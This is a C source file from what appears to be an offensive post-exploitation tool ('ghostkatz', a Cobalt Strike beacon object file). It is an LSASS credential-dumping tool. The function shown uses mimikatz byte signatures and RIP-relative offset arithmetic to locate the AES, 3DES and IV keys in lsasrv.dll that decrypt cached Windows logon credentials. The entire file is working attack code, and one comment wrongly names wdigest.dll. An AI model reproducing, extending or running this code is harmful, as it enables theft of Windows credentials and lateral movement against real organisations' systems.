#pragma once
#include <windows.h>
#include <ntstatus.h>

#include "ghostkatz.h"
#include "defs.h"
#include "lsass_offsets.h"

BOOL SearchForCredentialKeys(char* pvWindowsVersion, DWORD64* hAesKeyAddress, DWORD64* h3DesKeyAddress, DWORD64* IVAddress)
{
    unsigned char* credentialKeySig = NULL;
    int KeySigSize = 0;
    int AES_OFFSET = 0;
    int DES_OFFSET = 0;
    int IV_OFFSET = 0;

    // Search for the string and get the corresponding hex value
    int i = 0;
    for (i = 0; i < 5; i++) {
        if (strcmp(LsassKeyOffsetsArray[i].WindowsVersion, pvWindowsVersion) == 0) {
            
            credentialKeySig = LsassKeyOffsetsArray[i].credentialKeySig;
            KeySigSize = LsassKeyOffsetsArray[i].KeySigSize;
            AES_OFFSET = LsassKeyOffsetsArray[i].AES_OFFSET;
            DES_OFFSET = LsassKeyOffsetsArray[i].DES_OFFSET;
            IV_OFFSET = LsassKeyOffsetsArray[i].IV_OFFSET;

            break;
        }
    }

    if (credentialKeySig == NULL || KeySigSize == 0 || AES_OFFSET == 0 || DES_OFFSET == 0 || IV_OFFSET == 0)
    {
        BeaconFormatPrintf(&outputbuffer, "Failed to get correct offsets for the Windows version!\n");
        return FALSE;
    }

    PBYTE lsasrvImageBase = (PBYTE)LoadLibraryA("lsasrv.dll");
    if (lsasrvImageBase == NULL)
    {
        BeaconFormatPrintf(&outputbuffer, "Failed to get lsasrv DLL address!");
        return FALSE;
    }

    PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)lsasrvImageBase;
    PIMAGE_NT_HEADERS pNtHdr = (PIMAGE_NT_HEADERS)((PBYTE)pDosHdr + pDosHdr->e_lfanew);
    PBYTE lsasrvTextBase = lsasrvImageBase + pNtHdr->OptionalHeader.BaseOfCode;
    DWORD lsasrvTextSize = pNtHdr->OptionalHeader.SizeOfCode;

    // Search for l_LogSessList signature within wdigest.dll and grab the offset
    DWORD credentialKeySigOffset = SearchPattern(lsasrvTextBase, lsasrvTextSize, credentialKeySig, KeySigSize);
    if (credentialKeySigOffset == 0) {
        BeaconFormatPrintf(&outputbuffer, "Could not find offset to AES/3Des/IV keys");
        return FALSE;
    }
    //DEBUG_PRINT("[*] Found AES/3Des/IV pattern offset at 0x%lx\n", credentialKeySigOffset);

    // Get the full address where the mimikatz byte pattern was found
    PBYTE AesKey_PatternAddress = lsasrvTextBase + credentialKeySigOffset + AES_OFFSET;
    //DEBUG_PRINT("Address to AesKey_PatternAddress: 0x%llx\n", AesKey_PatternAddress);

    PBYTE DesKey_PatternAddress = lsasrvTextBase + credentialKeySigOffset + DES_OFFSET;
    //DEBUG_PRINT("Address to DesKey_PatternAddress: 0x%llx\n", DesKey_PatternAddress);

    PBYTE IV_PatternAddress = lsasrvTextBase + credentialKeySigOffset + IV_OFFSET;
    //DEBUG_PRINT("Address to IV_PatternAddress: 0x%llx\n", IV_PatternAddress);

    // Now get the RIP offset from the pattern address so we can use it later
    // May look like  "48 8d 0d 97 f8 01 00    lea rcx,[rip+0x1f897] # 0x1f89e"  and we want to get the 0x1f897
    
    // The mimikatz offsets take us directly to the rip offset value we want to retrieve so we have to read 4 bytes forward and reverse the endianness
    DWORD AesKey_RipOffset =
        (AesKey_PatternAddress[3] << 24) |
        (AesKey_PatternAddress[2] << 16) |
        (AesKey_PatternAddress[1] << 8) |
        (AesKey_PatternAddress[0]);

    DWORD DesKey_RipOffset =
        (DesKey_PatternAddress[3] << 24) |
        (DesKey_PatternAddress[2] << 16) |
        (DesKey_PatternAddress[1] << 8) |
        (DesKey_PatternAddress[0]);

    DWORD IV_RipOffset =
        (IV_PatternAddress[3] << 24) |
        (IV_PatternAddress[2] << 16) |
        (IV_PatternAddress[1] << 8) |
        (IV_PatternAddress[0]);

    //DEBUG_PRINT("AesKey Rip Offset : 0x%llx\n", AesKey_RipOffset);
    //DEBUG_PRINT("DesKey Rip Offset : 0x%llx\n", DesKey_RipOffset);
    //DEBUG_PRINT("IV Rip Offset : 0x%llx\n", IV_RipOffset);

    // RIP-relative offsets are calculated from the instruction *following* the offset.
    // Mimikatz resolves the address 4 bytes too early (pointing directly at the offset),
    // so we must add 4 bytes to correct the final address.
    DWORD64 Real_AesKey_Address = AesKey_PatternAddress + AesKey_RipOffset + 4;
    DWORD64 Real_DesKey_Address = DesKey_PatternAddress + DesKey_RipOffset + 4;
    DWORD64 Real_IV_Address = IV_PatternAddress + IV_RipOffset + 4;

    //DEBUG_PRINT("[*] Real AesKey address: 0x%llx\n", Real_AesKey_Address);
    //DEBUG_PRINT("[*] Real DesKey address: 0x%llx\n", Real_DesKey_Address);
    //DEBUG_PRINT("[*] Real IV address: 0x%llx\n", Real_IV_Address);

    *hAesKeyAddress = Real_AesKey_Address;
    *h3DesKeyAddress = Real_DesKey_Address;
    *IVAddress = Real_IV_Address;

    return TRUE;
}